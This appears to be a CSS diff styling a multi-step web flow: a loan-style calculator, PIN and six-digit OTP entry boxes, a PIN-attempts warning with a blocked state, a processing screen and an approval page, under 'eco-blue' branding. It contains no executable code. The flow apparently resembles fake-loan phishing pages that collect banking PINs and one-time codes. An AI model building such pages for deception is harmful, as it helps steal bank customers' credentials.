@@ -365,4 +365,398 @@ body {
 
 /* ============================================================
    MESSAGE BOXES
-   ============================================================
+   ============================================================ */
+.msg-box {
+  border-radius: var(--radius-sm);
+  padding: 12px 16px;
+  font-size: 0.84rem;
+  margin-bottom: 16px;
+  display: none;
+  align-items: center;
+  gap: 10px;
+}
+
+.msg-box.show { display: flex; }
+
+.msg-box.error {
+  background: #fef2f2;
+  border: 1.5px solid #fecaca;
+  color: #991b1b;
+}
+
+.msg-box.success {
+  background: #f0fdf4;
+  border: 1.5px solid #bbf7d0;
+  color: #166534;
+}
+
+.msg-icon { font-weight: 700; }
+
+/* ============================================================
+   SUMMARY BOX
+   ============================================================ */
+.sum-box {
+  border: 1px solid #e0e0e0;
+  border-left: 4px solid var(--eco-blue);
+  border-radius: var(--radius-sm);
+  padding: 16px 14px;
+  margin: 16px 0;
+  background: #fafffe;
+}
+
+.sum-box h3 {
+  font-size: 0.88rem;
+  font-weight: 600;
+  margin-bottom: 12px;
+}
+
+.sum-row {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.82rem;
+  padding: 7px 0;
+  border-bottom: 1px solid #f0f0f0;
+}
+
+.sum-row:last-child { border-bottom: none; }
+
+.sum-row .sk { color: var(--text-light); }
+.sum-row .sv { font-weight: 500; }
+
+/* ============================================================
+   LANDING PAGE
+   ============================================================ */
+#page-landing { background: var(--page-bg); }
+
+.land-center {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 32px 16px;
+}
+
+.land-card {
+  width: 100%;
+  max-width: 520px;
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+  padding: 36px 32px;
+}
+
+.land-card h2 {
+  font-size: 1.45rem;
+  font-weight: 700;
+  text-align: center;
+  margin-bottom: 10px;
+}
+
+.land-card p {
+  text-align: center;
+  font-size: 0.9rem;
+  color: var(--text-light);
+  margin-bottom: 24px;
+}
+
+.land-footer {
+  background: var(--eco-blue);
+  padding: 14px;
+  text-align: center;
+  font-size: 0.77rem;
+  color: rgba(255,255,255,0.45);
+  flex-shrink: 0;
+}
+
+/* ============================================================
+   CALCULATOR (step 1)
+   ============================================================ */
+.calc-box {
+  background: #fafafa;
+  border: 1px solid #eee;
+  border-radius: var(--radius-sm);
+  padding: 20px;
+  margin-bottom: 22px;
+}
+
+.calc-row2 {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.81rem;
+  color: var(--text-mid);
+  margin-bottom: 6px;
+}
+
+.calc-row2 .cv {
+  color: var(--eco-blue);
+  font-weight: 600;
+}
+
+input[type=range] {
+  width: 100%;
+  -webkit-appearance: none;
+  height: 5px;
+  border-radius: 3px;
+  background: #ddd;
+  outline: none;
+  margin: 8px 0 4px;
+}
+
+input[type=range]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  width: 18px;
+  height: 18px;
+  background: var(--eco-blue);
+  border-radius: 50%;
+  border: 3px solid #fff;
+  cursor: pointer;
+}
+
+.range-ends {
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.72rem;
+  color: var(--text-light);
+}
+
+/* ============================================================
+   STEP CARDS
+   ============================================================ */
+.step-center {
+  flex: 1;
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  padding: 28px 16px;
+}
+
+.step-card {
+  width: 100%;
+  max-width: 480px;
+  background: #fff;
+  border-radius: var(--radius);
+  box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+  padding: 32px 28px;
+  transition: all 0.3s ease;
+  position: relative;
+  overflow: hidden;
+}
+
+.step-card h2 {
+  font-size: 1.25rem;
+  font-weight: 700;
+  text-align: center;
+  margin-bottom: 4px;
+}
+
+.step-sub {
+  text-align: center;
+  font-size: 0.82rem;
+  color: var(--text-light);
+  margin-bottom: 4px;
+}
+
+/* ============================================================
+   PROCESSING / WAITING
+   ============================================================ */
+#page-processing {
+  background: linear-gradient(160deg, var(--eco-blue), var(--eco-blue-dark));
+  align-items: center;
+  justify-content: center;
+}
+
+.proc-wrap {
+  text-align: center;
+  padding: 40px 24px;
+  max-width: 420px;
+}
+
+.proc-icon {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.1);
+  border: 2px solid rgba(255,255,255,0.3);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 2rem;
+  margin: 0 auto 24px;
+  animation: pulse 2s ease infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(255,204,0,0.3); }
+  50% { box-shadow: 0 0 0 16px rgba(255,204,0,0); }
+}
+
+.proc-wrap h2 {
+  font-size: 1.6rem;
+  font-weight: 700;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.proc-wrap p {
+  color: rgba(255,255,255,0.75);
+  font-size: 0.88rem;
+  line-height: 1.7;
+  margin-bottom: 24px;
+}
+
+/* ============================================================
+   PIN / OTP
+   ============================================================ */
+.pin-label {
+  font-size: 0.82rem;
+  color: var(--text-light);
+  text-align: center;
+  margin-bottom: 12px;
+}
+
+.pin-row {
+  display: flex;
+  gap: 10px;
+  justify-content: center;
+  margin-bottom: 12px;
+  align-items: center;
+}
+
+.pin-box {
+  width: 52px;
+  height: 52px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  text-align: center;
+  font-family: 'Inter', sans-serif;
+  font-size: 1.3rem;
+  font-weight: 700;
+  color: var(--eco-blue);
+  outline: none;
+}
+
+.pin-box:focus { border-color: var(--eco-blue); }
+
+.pin-eye,
+.pin-delete {
+  cursor: pointer;
+  color: var(--text-light);
+  font-size: 1rem;
+  background: none;
+  border: none;
+  margin-left: 6px;
+}
+
+.pin-delete:hover { color: var(--eco-blue); }
+
+.otp-section { margin-bottom: 24px; }
+
+.otp-section-title {
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--eco-blue);
+  margin-bottom: 12px;
+}
+
+.otp-inputs {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 12px;
+  width: 100%;
+}
+
+.otp-box {
+  flex: 1;
+  min-width: 0;
+  width: 0;
+  height: 52px;
+  border: 1.5px solid var(--border);
+  border-radius: var(--radius-sm);
+  text-align: center;
+  font-family: 'Inter', sans-serif;
+  font-size: 1.2rem;
+  font-weight: 700;
+  color: var(--eco-blue);
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.otp-box:focus { border-color: var(--eco-blue); }
+
+.otp-delete {
+  cursor: pointer;
+  color: var(--text-light);
+  font-size: 1rem;
+  background: none;
+  border: none;
+  margin-left: 6px;
+  padding: 0;
+  transition: color 0.2s;
+}
+
+.otp-delete:hover { color: var(--eco-blue); }
+
+/* ============================================================
+   PIN ATTEMPTS
+   ============================================================ */
+.pin-attempts {
+  text-align: center;
+  font-size: 0.85rem;
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  margin: 8px 0 12px;
+  font-weight: 500;
+}
+
+.pin-attempts.warning {
+  background: #fef3c7;
+  color: #92400e;
+  border: 1px solid #f59e0b;
+}
+
+.pin-attempts.blocked {
+  background: #fee2e2;
+  color: #991b1b;
+  border: 1px solid #ef4444;
+  animation: pulse-blocked 1.5s ease infinite;
+}
+
+.pin-attempts.available {
+  background: #d1fae5;
+  color: #065f46;
+  border: 1px solid #10b981;
+}
+
+@keyframes pulse-blocked {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.6; }
+}
+
+/* ============================================================
+   APPROVAL PAGE
+   ============================================================ */
+.appr-wrap {
+  background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
+  align-items: center;
+  justify-content: center;
+}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 600px) {
+  .field-row { grid-template-columns: 1fr; }
+  .pin-box { width: 44px; height: 44px; font-size: 1.1rem; }
+  .otp-box { height: 44px; font-size: 1rem; }
+  .land-card,
+  .step-card { padding: 24px 18px; }
+  .proc-wrap h2 { font-size: 1.3rem; }
+  .proc-icon { width: 60px; height: 60px; font-size: 1.5rem; }
+}
+
+@media (max-width: 400px) {
+  .pin-box { width: 36px; height: 36px; font-size: 0.9rem; }
+  .otp-box { height: 38px; font-size: 0.85rem; }
+  .pin-row { gap: 6px; }
+  .otp-inputs { gap: 5px; }
+}
